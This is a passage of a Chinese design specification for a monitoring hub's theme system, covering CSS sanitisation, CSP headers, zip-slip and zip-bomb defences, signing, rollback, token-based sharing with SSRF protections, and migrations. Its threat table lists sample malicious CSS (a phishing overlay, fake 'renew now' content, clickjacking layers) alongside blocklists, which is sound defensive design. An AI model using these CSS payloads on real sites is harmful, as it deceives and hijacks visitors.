| `position:fixed` 钓鱼遮罩 | `.k-bad{position:fixed;inset:0;background:#fff;z-index:9999}` | ① theme CSS **禁止 `position:fixed`**（`sticky` 仅允许出现在 Hub 预置的 `data-k-*` 选择器下，白名单校验）；② 禁止自定义 `z-index` 超过 `--kokoro-z-modal` 的字面量（>1100 的数字直接丢弃该声明）；③ 主题 CSS 作用域限定：Hub 给每条选择器前置 `#k-root `（作者写 `.k-card` → 实际 `#k-root .k-card`），任何试图命中 `html` `body` `*` `:root` 的选择器拒绝 |
| `:root` 变量劫持 | `:root{--kokoro-color-bg:#000}` | 主题 CSS 禁止 `:root` / `html` / `body` 选择器（变量只能走 tokens JSON，见 §3.2） |
| 内容注入 | `::after{content:"管理员：你的机器已到期，点此续费"}` | 允许 `content` 但只接受静态字符串，且**禁止 `content` 中含 `url()`**；同时所有"文案类"内容应走 layout 字段而非 CSS |
| 点击劫持/透明层 | `opacity:0` + 覆盖 | 由作用域限定 + `position:fixed` 禁令 + `z-index` 上限共同限制；再加 `X-Frame-Options: DENY`（Hub 全局已有） |
| 表达式（老 IE） | `width:expression(...)` | 词法层黑名单：`expression(` `behavior:` `-moz-binding:` `@namespace`（防 XXE 式玩法）一律拒绝整条声明 |
| 选择器炸弹/性能 | `*{box-shadow:...}` 上千条 | 规则数上限 800 条；单条选择器长度 ≤ 200；禁止通用选择器 `*` 单独作为最右选择器（复合选择器中的 `*` 允许） |

实现建议：不引入重型 CSS parser，用一个 300 行的分词器（`{ } : ; ( )` 与注释感知）+ 声明级正则黑名单即可覆盖上面全部条目；遇到无法解析的结构 → **保守拒绝该规则**（fail-closed），并在安装报告里列出被丢弃的规则。

### 5.2 远程资源加载

Hub 全局响应头（对所有页面，不只是主题）：

```
Content-Security-Policy:
  default-src 'self';
  base-uri 'none';
  object-src 'none';
  frame-ancestors 'none';
  script-src  'self' 'nonce-<per-request-random>';
  style-src   'self' 'nonce-<per-request-random>';
  img-src     'self' data:image/png data:image/jpeg data:image/webp data:image/gif;
  font-src    'self';
  connect-src 'self';                         # HTMX / SSE 都走同源
  form-action 'self';
  media-src   'self';
  frame-src   'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

要点：

- **不使用 `unsafe-inline`**：tokens/layout/HTMX 内联脚本全部带 per-request nonce。这直接消灭了"主题 CSS 里塞 `<style>` 逃逸"和任何内联脚本注入。
- **不使用 `unsafe-eval`**：HTMX 不需要。
- 主题资源只从 `/_theme-assets/<themeID>/<version>/<path>` 同源加载，响应额外带 `Content-Security-Policy: default-src 'none'; sandbox` 与 `nosniff`，SVG 即便被直接打开也无法执行脚本或发请求。
- `img-src` 允许 `data:` 是给主题内嵌小图标用的；SVG **不允许**作为 `data:` URI，也不允许出现在 CSS `url()` 中（只能作为 `<img src>` 的包内资源）。
- 主题无法让浏览器发起任何跨域请求：`connect-src 'self'` + `url()` 白名单 + 无 JS。外泄通道为零。

### 5.3 模板覆盖的代码执行面

见 §4.2 - §4.4，核心四条：冻结 DTO、FuncMap 白名单、AST 静态检查、输出/耗时上限 + 自动回退。

### 5.4 zip-slip 路径穿越

```go
func safeJoin(root, name string) (string, error) {
    if name == "" || strings.ContainsAny(name, "\x00\\:") { return "", ErrBadName }
    if strings.HasPrefix(name, "/") || strings.HasPrefix(name, "./") { return "", ErrBadName }
    if filepath.IsAbs(name) { return "", ErrBadName }
    if regexp.MustCompile(`(^|/)\.\.(/|$)`).MatchString(name) { return "", ErrBadName }
    if !fileRe.MatchString(name) { return "", ErrBadName }   // ^[A-Za-z0-9._/-]+$
    clean := filepath.Clean(filepath.FromSlash(name))
    if strings.HasPrefix(clean, "..") { return "", ErrBadName }
    dst := filepath.Join(root, clean)
    if dst != root && !strings.HasPrefix(dst, root+string(os.PathSeparator)) { return "", ErrBadName }
    return dst, nil
}
```

附加：

- `zip.FileHeader.Mode()&os.ModeType != 0` → 拒绝（排除目录条目以外的 symlink/device/fifo；目录条目只用于创建目录，不读取内容）。
- 拒绝重复路径（zip 可以有同名条目，后者覆盖前者 → 直接判非法）。
- 拒绝 `NonUTF8` 之外的畸形名；`UTF-8` flag 未设置时按 CP437 解码后再过一遍 `fileRe`。
- 落盘权限统一：文件 `0644`，目录 `0755`，不使用包内任何权限位。
- 目标根固定为 `data/themes/.staging/<uuid>/`，UUID 由 Hub 生成，不受包控制。

### 5.5 体积与数量上限

| 项 | 上限 | 触发时 |
|---|---|---|
| 压缩包总大小 | 8 MiB | 下载/上传阶段即拒绝 |
| 解压后总大小 | 24 MiB | 中央目录扫描阶段拒绝（不解压） |
| 单文件解压后 | 1 MiB（图片）/ 2 MiB（字体）/ 256 KiB（CSS、JSON、tmpl） | 中央目录扫描阶段拒绝 |
| 条目数 | 300 | 扫描阶段拒绝 |
| 压缩比 | 单条 ≤ 200:1，整体 ≤ 60:1 | 扫描阶段拒绝（zip bomb） |
| CSS 规则数 | 800 条 / 单文件 256 KiB | 消毒阶段 |
| 目录层级 | ≤ 4 层 | 扫描阶段 |
| 单主题占用磁盘 | 32 MiB（安装后校验） | 超限拒绝安装，提示精简资源 |

字体额外：`woff2` 优先；单字体 ≤ 500 KiB；全部字体合计 ≤ 2 MiB（`font-display:swap`，且 Hub 只生成 `@font-face` 不预加载）。

### 5.6 签名与校验

见 §2.3.4 / §2.3.5。补充运维侧：

- 官方公钥硬编码进二进制（`internal/theme/trust/official_ed25519.pub`），随 Hub 升级轮换（支持同时信任 2 把 key 做平滑轮换）。
- 社区 key：`data/trusted-theme-keys.json`，`{keyId, algorithm, publicKey(base64), addedAt, note}`。首次遇到未知 key → 后台显示指纹（分 4 组，如 `9F2A-41C0-7B3E-8D51`），管理员手动确认后写入。
- 已安装主题每次 Hub 启动做一次"完整性自检"（manifest checksum + files sha256），不匹配 → 该主题标 `corrupted`、自动回退到上一个可用主题、后台醒目提示（防止磁盘位翻转/被人手改文件）。
- 未签名主题：允许安装使用，但 ① UI 打黄标；② **禁止启用第三层 overrides**；③ 从"一键抄站点"路径获取时默认拒绝未签名（可在设置里放开）。

### 5.7 一键回滚与"上一个可用皮肤"快照

状态文件 `data/theme-state.json`（原子写：写 `.tmp` 后 `rename`）：

```json
{
  "active": { "id": "neon-dream", "version": "1.2.0", "activatedAt": "2026-10-05T10:00:00Z" },
  "lastGood": { "id": "kokoro.daylight", "version": "1.4.0", "activatedAt": "2026-10-01T08:00:00Z",
                "reason": "manual-switch" },
  "fallbackCount": 0,
  "autoRollbackEnabled": true
}
```

机制：

1. **激活前金丝雀渲染**：激活不是改个指针就完事。Hub 在切换前用新主题在**进程内**渲染三个页面（首页、某机器详情页、后台设置页）到 `io.Discard`，带 2 秒总超时与 1 MiB 输出上限。任一失败 → 拒绝激活，返回具体失败点。
2. **激活后在线探测**：切换后 60 秒内，前 5 次真实请求若出现渲染 error / panic（recover 兜底）/ 输出异常（`< 512` 字节）≥ 2 次 → 自动回滚到 `lastGood`，`fallbackCount++`，后台告警。
3. **快照**：`lastGood` 只在"连续正常运行 ≥ 10 分钟"后才被当前主题覆盖（避免把坏主题记成 lastGood）。快照保存的是**主题 id + version**（主题包本身保留在磁盘，不额外复制资源），因此回滚瞬时完成。
4. **手动回滚**：`POST /api/v1/themes/rollback`，任何时候一键回到 `lastGood`。
5. **删除保护**：`lastGood` 与 `active` 指向的主题不允许删除；内置主题不可删除。
6. **逃生通道**（再次强调）：`?k_safe=1` 与 `--theme=builtin:kokoro.daylight`，两者都不依赖数据库里的主题状态。
7. **连续失败熔断**：`fallbackCount` 在 24h 内 ≥ 3 次 → 自动锁定为内置默认主题，需要管理员手动解锁（防止坏主题被反复激活刷屏）。

---

## 6. 分发与获取路径

统一 API 前缀 `/api/v1`，写操作需要管理员会话 + `X-CSRF-Token`，全部返回 `application/json`。

### 6.1 路径 A：官方 / 社区主题源索引

索引文件（静态 JSON，官方签名，可镜像）：

```
GET https://themes.kokoro.example/index.json
```

```json
{
  "schemaVersion": 1,
  "generatedAt": "2026-10-05T00:00:00Z",
  "signature": { "algorithm": "ed25519", "keyId": "kokoro-index-2026", "value": "..." },
  "themes": [
    {
      "id": "neon-dream",
      "name": "霓虹梦 Neon Dream",
      "version": "1.2.0",
      "author": "yifen",
      "homepage": "https://example.com/kokoro/neon-dream",
      "license": "MIT",
      "description": "深紫底 + 青品红发光",
      "tags": ["dark", "neon", "card"],
      "compatibility": { "kokoro": ">=1.4.0 <2.0.0" },
      "downloadURL": "https://themes.kokoro.example/t/neon-dream/1.2.0.kokoro-theme",
      "sha256": "9c1f...aa",
      "size": 412876,
      "previewURL": "https://themes.kokoro.example/t/neon-dream/preview.png",
      "previewDarkURL": "https://themes.kokoro.example/t/neon-dream/preview-dark.png",
      "downloads": 1284,
      "updatedAt": "2026-10-05T00:00:00Z",
      "trust": "official"           // official | community | unsigned
    }
  ]
}
```

Hub 侧接口：

| 方法 | 路径 | 说明 |
|---|---|---|
| `GET` | `/api/v1/themes/registry` | 返回 Hub 已缓存的索引（本地 `data/theme-index.json`），字段同上 |
| `POST` | `/api/v1/themes/registry/sync` | 拉取远端索引。body `{"url":"https://themes.kokoro.example/index.json"}`；带 `If-None-Match`（ETag）与 24h 最小间隔；校验索引签名后才覆盖本地缓存 |
| `POST` | `/api/v1/themes/install` | body `{"source":"registry","id":"neon-dream","version":"1.2.0"}`，同步执行，返回安装报告 |

前端流程：

```
设置 → 主题 → 主题市场
1. 打开即展示本地缓存索引（离线也能看），顶部显示"上次同步：3 小时前"
2. 点"同步索引" → POST /registry/sync → 服务端拉取 + 验签 + 覆盖缓存 → 返回新条目数
3. 卡片墙：预览图（lazy loading）+ 名称/作者/版本/体积/兼容标记/签名徽章
4. 不兼容的主题灰显，hover 提示"需要 Hub >= 1.6.0"
5. 点"安装" → POST /themes/install → 服务端下载(限 8MiB/15s/不跟随重定向) → 走 §2.5 校验 → 返回 staged
6. 弹出安装报告：作者 / 签名状态 / 被消毒丢弃的 CSS 规则数 / overrides 槽位清单（若有）
7. 点"应用" → POST /themes/:id/activate → 金丝雀渲染 → 成功则返回新 ETag，页面 reload
8. 15 秒内出现"是否保留？[保留] [撤销]"的确认条，超时自动撤销（防误操作锁死自己）
```

### 6.2 路径 B：从任意另一个 Kokoro 站点"一键抄"

这是老板最想要的那条。设计要点：**让 Hub 的后端去取，别让浏览器跨域去取。**

#### B-1 源站（A 站）签发一次性安装令牌

```
POST /api/v1/themes/{id}/share-token
Authorization: 管理员会话 + X-CSRF-Token
Body: {}
Response 200:
{
  "token": "kt_9f2a41c07b3e8d51e6a0",
  "expiresAt": "2026-10-05T10:10:00Z",   // 签发后 10 分钟
  "scope": "theme:export:once",
  "themeId": "neon-dream",
  "version": "1.2.0",
  "issuer": "https://a.example",
  "shareURL": "https://a.example/t/neon-dream?install=kt_9f2a41c07b3e8d51e6a0",
  "oneTime": true
}
```

服务端实现：

- 令牌 = 32 字节随机数，DB 只存 `sha256(token)`；字段 `(hash, themeId, version, issuedAt, expiresAt, usedAt, issuerOrigin, rateKey)`。
- **一次性**：首次成功兑付即写 `usedAt`；再次使用返回 `410 Gone`。
- **有效期 10 分钟**，过期返回 `410`。
- **权限范围只读**：只能下载该主题的只读副本。副本里**剥除** `signature`（签名属于原作者，不该被转发成"已验签"）与 `overrides`（跨站传播可执行模板风险太高），并在 manifest 里加 `"originNote": {"copiedFrom":"https://a.example","originalId":"neon-dream","stripped":["signature","overrides"]}`。
- **限速**：每管理员会话 10 次/小时，每 IP 30 次/小时；签发与兑付分别计数。
- 主题可声明分享策略 `sharePolicy: public | token | off`（存在 A 站主题记录里）：`public` 任何人可直接 `GET /api/v1/themes/{id}/download`；`token` 必须带令牌；`off` 不签发令牌。默认 `token`。
- 令牌不进日志（日志里只打 `token=<sha256 前 8 位>`）。

兑付接口：

```
GET /api/v1/themes/{id}/download?token=kt_9f2a41c07b3e8d51e6a0
Response 200: application/octet-stream, Content-Disposition: attachment; filename="neon-dream-1.2.0.kokoro-theme"
Headers: X-Kokoro-Theme-Id, X-Kokoro-Theme-Version, X-Kokoro-Stripped: signature,overrides
```

#### B-2 目标站（B 站）拉取

```
POST /api/v1/themes/install-from-token
Body: {
  "issuer": "https://a.example",
  "themeId": "neon-dream",
  "token": "kt_9f2a41c07b3e8d51e6a0"
}
Response 202: { "taskId": "t_77", "status": "downloading" }
GET /api/v1/themes/tasks/t_77
Response 200: { "status": "validating", "progress": 60, "bytes": 412876 }
完成时: { "status": "staged", "theme": { "id":"neon-dream","version":"1.2.0","signed":false,
          "warnings":["signature stripped by source","overrides stripped by source"] } }
```

B 站后端 `GET https://a.example/api/v1/themes/neon-dream/download?token=...`，**SSRF 防护清单**（因为 issuer 是用户填的任意地址）：

1. 只允许 `https://`，拒绝 `http://` 与其它 scheme；端口只允许 443（或显式非标准端口但需在设置里开）。
2. 先 DNS 解析，对**全部**解析结果做 IP 校验：拒绝 loopback `127.0.0.0/8`、私网 `10/8` `172.16/12` `192.168/16`、link-local `169.254/16`（含云元数据 `169.254.169.254`）、CGNAT `100.64/10`、IPv6 ULA/link-local/loopback、组播、保留段。
3. 自定义 `http.Client`：把 dialer 的 `Control` 钩子里再校验一次实际连接 IP，防 DNS rebinding。
4. **不允许跟随重定向**（`CheckRedirect` 返回 `http.ErrUseLastResponse`），最多 0 跳。
5. 超时：连接 5s，整体 15s；响应体 `io.LimitReader(8 MiB + 1)`，超出即判失败。
6. 不发送任何 B 站的 Cookie / 认证头；UA 固定 `Kokoro/<hubVersion> (+theme-fetch)`。
7. 可选开关 `theme.allowRemoteFetch`（默认 `true`），保守站点可关，只留上传与官方索引。
8. 失败信息不回显内网细节（统一 "无法从该站点获取主题"）。

#### B-3 为什么不走浏览器跨域

| 方案 | 问题 | 结论 |
|---|---|---|
| A 站页面直接 `fetch("https://b.example/api/...")` | 跨域 + 需要 B 站对 A 站 origin 放行 `Access-Control-Allow-Credentials`，而 B 站是自托管、不可能预知所有来源站；放行 `*` 又等于把管理员会话暴露给任意站点 | 否 |
| 官方中继页 `https://kokoro.example/install#token=...` 转发到 B 站 | 需要 B 站内置官方域名白名单并放行其 CORS 写请求；一旦中继站被攻破就能给任意 Hub 装任意主题 | 否（仅作为"帮助页"存在，不承载写操作） |
| **B 站后端 server-to-server 拉取** | 需要防 SSRF，但防护手段成熟（上面 8 条）；不依赖浏览器、不依赖 CORS、不暴露会话 | ✅ 选它 |

#### B-4 前端交互流程（两种入口）

入口 1 —— **在 A 站复制，到 B 站粘贴**（推荐，最简单最稳）：

```
A 站：设置 → 主题 → [分享]
   → 弹窗显示令牌 + 一键复制按钮（复制内容 = JSON 片段或一行文本）：
     kokoro-theme://import?from=https%3A%2F%2Fa.example&id=neon-dream&token=kt_9f2a...
   → 同时显示 10 分钟倒计时
B 站：设置 → 主题 → [从其他站点获取]
   → 粘贴框（或扫二维码）→ 解析出 issuer/id/token
   → POST /themes/install-from-token → 轮询任务 → 安装报告 → [应用]
```

入口 2 —— **A 站给出下载链接，手动上传**：A 站 `[分享]` 弹窗里同时提供"直接下载 `.kokoro-theme`"按钮 → 用户在 B 站走路径 C 上传。这条不需要任何跨域协商，永远可用，是兜底。

### 6.3 路径 C：手动上传 / CLI / 本地目录

```
POST /api/v1/themes/upload
Content-Type: multipart/form-data
  file: <binary, <= 8 MiB>
  activate: "0" | "1"
Response 200: { "id":"neon-dream","version":"1.2.0","status":"staged","report":{...} }
```

- 拖拽上传：列表页 `<form hx-post="/api/v1/themes/upload" hx-encoding="multipart/form-data">`，HTMX 原生支持，无额外 JS。
- CLI：`kokoro theme install ./x.kokoro-theme [--activate]`（直连本地 SQLite + 同一套校验代码）、`kokoro theme list`、`kokoro theme export <id> -o out.kokoro-theme`、`kokoro theme rollback`。
- 目录扫描：Hub 启动与 `SIGHUP` 时扫描 `data/themes/autoload/*.kokoro-theme`，安装成功后重命名为 `.installed`。
- 本地手改：`data/themes/<id>/<version>/` 里的文件改完后 `POST /api/v1/themes/{id}/rescan` 重新校验并刷新 checksum（开发模式便利，生产下 `theme.allowRescan=false`）。

### 6.4 其余主题 API

| 方法 | 路径 | 说明 |
|---|---|---|
| `GET` | `/api/v1/themes` | 已安装列表：`[{id,name,version,source,active,signed,compatible,warnings}]` |
| `GET` | `/api/v1/themes/{id}` | 详情：完整 manifest + 消毒报告 + diff 路径 + 磁盘占用 |
| `POST` | `/api/v1/themes/{id}/activate` | 金丝雀渲染后切换。返回 `{"etag":"\"a3f\"","canary":{"home":"ok","detail":"ok","admin":"ok","ms":41}}` |
| `POST` | `/api/v1/themes/rollback` | 回到 `lastGood` |
| `DELETE` | `/api/v1/themes/{id}` | 删除（active 与 lastGood 禁止） |
| `GET` | `/api/v1/themes/{id}/export` | 导出当前主题（含用户 patches，可选合并进 manifest：`?withPatches=1`） |
| `GET` | `/api/v1/themes/{id}/preview` | 返回预览图（供后台卡片展示） |
| `PUT` | `/api/v1/themes/{id}/tokens` | 管理员在线改变量（body = 完整 tokens 对象），写 `data/token-overrides.json` |
| `PATCH` | `/api/v1/themes/{id}/layout` | 用户布局覆盖（§3.7），`If-Match` 乐观锁 |
| `DELETE` | `/api/v1/themes/{id}/layout?path=...` | 恢复主题默认 |
| `POST` | `/api/v1/themes/{id}/overrides/enable` | body `{"slots":["slot-footer"],"confirm":true}`，逐个启用第三层 |
| `GET` | `/api/v1/themes/{id}/diff/{slot}` | 返回 unified diff 文本 |
| `GET` | `/api/v1/themes/slots` | 插槽白名单 + DTO 字段表 + 内置源码 |
| `GET` | `/_theme-assets/{id}/{version}/{path...}` | 主题资源，同源，带 `nosniff` 与 `CSP: default-src 'none'; sandbox` |
| `GET` | `/_preview?draft={uuid}` | 草稿预览（仅管理员），走与生产完全相同的渲染管线与 CSP |

主题编辑器 UI（后台）：

- 左侧分组表单（颜色拾取器 / 长度输入 / 枚举下拉），右侧 iframe 实时预览（`/\_preview?draft=` + `hx-trigger="change changed delay:300ms"`）。
- 改完点"保存为副本"→ 生成新 id `<原 id>-custom`，不覆盖原包（保证可升级、可导出）。
- 点"导出"→ `GET /api/v1/themes/{id}/export?withPatches=1` → 拿到 `.kokoro-theme` → 可直接分享给别人（路径 B/C）。

---

## 7. 内置官方皮肤

### 当前只维护 1 套

| # | id / 名称 | 一句话风格 | primary | bg | surface | accent | radius-md | font-sans | 关键特征 |
|---|---|---|---|---|---|---|---|---|---|
| 1 | `kokoro.daylight`<br>**晨白**（默认） | 干净中性的浅色通用皮，像 GitHub 的克制版 | `#2f6feb` | `#ffffff` | `#ffffff` | `#7c5cff` | `8px` | `system-ui, 'PingFang SC', 'Microsoft YaHei', sans-serif` | `bg-subtle:#f6f8fa`；`border:#d0d7de`；`shadow-sm:0 1px 2px rgba(31,35,40,.08)`；列表默认 `card`；Hero 默认关闭；`statusDotStyle:solid` |

随二进制 `go:embed`，`id` 前缀 `kokoro.`（保留前缀，社区主题不可冒用）。

**为什么现在只有一套**：UI 还没定稿。此时维护多套皮肤，等于要在没定的界面上反复调
五倍的变量，还容易让人误以为某些布局形态已定稿。等界面敲定后再按实际形态补内置主题。

### 主题切换能力是完整的

只有一套内置主题**不等于**只有一个主题：

- 页头右上角的皮肤下拉**只要装了至少一套就显示**，单主题时也显示——它是访客唯一能
  看到"本站支持换外观"以及"我正用着哪套"的地方，可发现性优先于整洁；
- 访客可在首页/详情页通过 `/pick/<id>` 自选，只写自己的 cookie，不影响他人；
- 管理员可通过 `/theme/<id>` 改站点默认主题，影响所有人；
- 社区主题随时可以导入，导入后立刻出现在访客的可选列表里。

所以 UI 定稿前的主题可玩性已经可以验证，只是内置集合还没扩。

### 曾规划但尚未实现的形态

以下是设计阶段讨论过的形态，**当前不存在**。保留记录是为了说明
「布局可以变哪些维度」，不是承诺会实现：

| 形态 | 设想风格 | 关键特征（layout 层面） |
|---|---|---|
| 午夜 | 低饱和深蓝黑，值班大屏 | `mode.default:dark`；图表 `line`；列表 `table`（信息密度高） |
| 终端 | 纯黑 + 磷光绿 + 等宽字体，零圆角 | 列表 `compact` + `inlineBars` + `density:compact`；`usageBarStyle:segmented`；`tagStyle:text`；图表 `area`、`smooth:false` |
| 纸感 | 米白纸质 + 衬线标题 + 大留白，像个人博客 | `space` 整体放大一档；Hero `plain` + `align:left`；详情页 `header.variant:hero`；`sectionGap:48px`；`mode.supportsDark:false` |
| 霓虹 | 深紫底 + 青品红发光，毛玻璃展示型 | `radius-lg:22px`；`backdrop-blur:8px`、`header.variant:blur`；`statusDotStyle:glow`；`tagStyle:pill`；Hero `gradient` |

其中「终端」的列表段长这样，可作为 `compact` 形态的写法参考：

```json
"home": {
  "hero": { "enabled": false },
  "list": {
    "mode": "compact",
    "allowUserSwitch": true,
    "availableModes": ["compact", "table", "card", "map"],
    "defaultSort": { "by": "load", "order": "desc" },
    "compact": { "rowHeight": "40px", "dividers": false, "showFlag": false, "inlineBars": true,
                 "fields": ["name", "status", "cpu", "mem", "net", "uptime"] }
  }
}
```

完整的 token / layout 取值见 `docs/themes/` 下的示例文件
（`example-terminal.json`、`example-paper.json`），它们是**规范示例**，
不是可安装的内置主题。

---

## 8. 版本兼容与迁移

### 8.1 兼容范围校验

- `compatibility.kokoro` 使用逗号分隔的 semver 子句，实现用 `golang.org/x/mod/semver`（注意它要求版本带前导 `v`，内部统一加 `v` 前缀处理）。
- 校验时机：安装时、Hub 升级后启动时（全量复检所有已安装主题）。
- 结果四态：

| 状态 | 含义 | UI |
|---|---|---|
| `compatible` | 在范围内 | 正常 |
| `dev-only` | 范围上限高于当前版本 | 灰显，"需要 Hub >= X" |
| `deprecated` | 当前版本高于范围上限，但在同一大版本内 | 黄标，"作者声明支持到 1.x，当前 1.9，可能有样式偏差"，**仍可激活** |
| `incompatible` | 跨大版本 | 红标，禁止激活；提供"强制激活（后果自负）"二次确认，激活后在页面顶部打水印提示 |

- Hub 大版本升级后，所有 `incompatible` 主题自动停用并回退到内置默认，升级日志里逐条列出。

### 8.2 变量改名：废弃别名机制

CSS 变量表会演进。Hub 在 `internal/theme/schema` 里维护迁移表：

```go
// tokensSchemaVersion -> 该版本引入的重命名/删除
var TokenAliases = map[string]string{
    // 旧名 -> 新名（v1 -> v2）
    "--kokoro-color-brand":         "--kokoro-color-primary",
    "--kokoro-color-brand-fg":      "--kokoro-color-primary-fg",
    "--kokoro-color-panel":         "--kokoro-color-surface",
    "--kokoro-color-panel-alt":     "--kokoro-color-surface-sunken",
    "--kokoro-color-fg":            "--kokoro-color-text",
    "--kokoro-color-fg-muted":      "--kokoro-color-text-muted",
    "--kokoro-radius":              "--kokoro-radius-md",
    "--kokoro-gap":                 "--kokoro-space-4",
    "--kokoro-chart-1":             "--kokoro-chart-series-1",
    // ... series-2..8 同理
}
var DeprecatedTokens = []string{"--kokoro-color-shadow"}  // 删除且无替代
```

三条规则：

1. **向后**：Hub 注入变量时，除输出当前版本变量外，**额外输出所有别名**，形如 `--kokoro-color-brand: var(--kokoro-color-primary);`。这样按 v1 写的老主题在新 Hub 上继续有效，零改动。
2. **向前**：主题声明 `tokensSchemaVersion: 1` 而 Hub 当前是 2 时，Hub 把主题提交的 v1 变量名**自动映射**到 v2（`--kokoro-color-brand` 的值写进 `--kokoro-color-primary`），再注入。老主题的作者不用改包。
3. **告警与一键迁移**：后台对每个主题计算"使用了 N 个废弃变量"，列出旧名→新名对照，提供"迁移到 v2"按钮（重写主题副本的 tokens 键名并 `tokensSchemaVersion+1`）。

删除策略：一个变量进入 `DeprecatedTokens` 后，别名保留**至少两个大版本**才真正停止输出；停止输出前主题会收到 `warning` 级提示。

### 8.3 layout 字段演进

- 未知键：忽略 + warning（不报错），保证新 Hub 装老主题、老 Hub 装新主题都不炸。
- 未知枚举值：回退该键默认值 + warning，并在后台"主题诊断"里列出。
- 需要结构性变更时（如 `home.list.card.columns` 从数字改成对象），在 `layoutSchemaVersion` 上 +1，并写迁移函数：

```go
var LayoutMigrations = []Migration{
    {From: 1, To: 2, Fn: func(m map[string]any) error {
        // home.list.card.columns: 240 (px 数字) -> {"minWidth":"240px","maxWidth":"1fr"}
        ...
        return nil
    }},
}
```

安装时按 `layoutSchemaVersion` 依次应用迁移链到当前版本；迁移失败 → 拒绝安装（布局迁移失败会导致明显错版，比 CSS 变量更严重，因此不做宽松处理）。

### 8.4 插槽与 DTO 演进

- slot 只增不改；废弃标记 `Deprecated: "<version>"` 后保留两个小版本，期间渲染时后台提示"该 slot 将在 X 版本移除"。
- DTO 字段只增不删；删除前两个小版本标记 `Deprecated`，渲染时该字段返回零值并记 warning。
- Hub 升级后若内置 slot 源码有变化 → 第三层 diff 需重新确认（§4.5）。

### 8.5 官方主题随版本升级

内置主题的 `theme.json` 随 Hub 发布一同更新（版本跟随 Hub 小版本）。用户基于内置主题创建的副本（`id` 为 `<base>-custom`）**不自动跟随**，后台提供"对比上游更新"按钮，列出上游改了哪些 token / layout 键，用户选择性合并。

---

## 9. 落地实现清单（建议顺序）

| 步骤 | 内容 | 产出 |
|---|---|---|
| 1 | `internal/theme/schema`：变量表 + 别名表 + layout 默认值与枚举 | 一份 `schema.go`，所有枚举集中定义 |
| 2 | `internal/theme/render`：tokens → `<style nonce>`、layout → data 属性 + `--k-*` 变量 | 内置 `base.css` 覆盖四种列表模式与两种详情头 |
| 3 | 内置 5 套皮肤（就是 5 份 `theme.json` + 预览图） + `go:embed` | 开箱有货，先有可卖弄的东西 |
| 4 | `internal/theme/csssanitize`：分词 + 黑名单 + 选择器作用域前置 + url 白名单 | 有单测：§5.1 每条风险一个用例 |
| 5 | `internal/theme/pkg`：zip 解包（§2.5 全流程） + zip-slip 防护 | CLI `kokoro theme install` 先跑通 |
| 6 | 后台 UI：主题列表 / 应用 / 回滚 / 布局编辑（含拖拽）/ token 表单 | 第二层闭环 |
| 7 | 导出 + 上传 + `install-from-token`（SSRF 防护）+ 官方索引同步 | 三条分发路径闭环 |
| 8 | 第三层：slot 白名单、DTO 反射断言、AST 静态检查、diff、金丝雀渲染与自动回滚 | 默认关闭，开关在配置里 |
| 9 | 签名（Ed25519）、官方公钥内置、社区 key TOFU | 信任体系 |

---

## 附录 A：错误码表（安装相关）

| code | HTTP | 含义 |
|---|---|---|
| `theme.pkg.too_large` | 413 | 包体积超限 |
| `theme.pkg.too_many_entries` | 400 | 条目数超限 |
| `theme.pkg.bad_entry_name` | 400 | 路径非法（穿越 / 特殊字符 / 非普通文件） |
| `theme.pkg.entry_type_denied` | 400 | 含 symlink / 非普通文件 / JS 文件 |
| `theme.pkg.manifest_missing` | 400 | 无 `theme.json` |
| `theme.pkg.checksum_mismatch` | 400 | checksum 不符 |
| `theme.pkg.signature_invalid` | 400 | 签名验不过 |
| `theme.pkg.id_reserved` | 400 | 使用 `kokoro.` 保留前缀 |
| `theme.pkg.incompatible` | 409 | 兼容范围不匹配 |
| `theme.css.rule_dropped` | 200(warning) | 若干 CSS 规则被消毒丢弃（不阻断安装） |
| `theme.override.slot_unknown` | 400 | slot 不在白名单 |
| `theme.override.ast_denied` | 400 | 模板 AST 检查不通过（附节点位置） |
| `theme.activate.canary_failed` | 409 | 金丝雀渲染失败，未激活 |
| `theme.activate.auto_rolled_back` | 200(warning) | 激活后探测失败已自动回滚 |
| `theme.fetch.ssrf_blocked` | 400 | 远端地址命中 SSRF 规则 |
| `theme.fetch.token_invalid` | 410 | 分享令牌无效 / 已用 / 过期 |

---

## 附录 B：最小可安装主题（10 行，用于自测）

```json
{
  "schemaVersion": 1,
  "id": "hello-min",
  "name": "最小主题",
  "version": "0.1.0",
  "author": "tester",
  "preview": "preview.png",
  "compatibility": { "kokoro": ">=1.4.0 <2.0.0" },
  "tokensSchemaVersion": 2,
  "tokens": { "color": { "primary": "#ff6600" } },
  "layoutSchemaVersion": 1,
  "layout": { "home": { "list": { "mode": "compact" } } },
  "checksum": "sha256:<重算后填入>"
}
```

其余字段全部取默认值即可安装成功——这条"最小集"应当有单元测试守着，任何新增强制字段都必须同步更新这个用例。
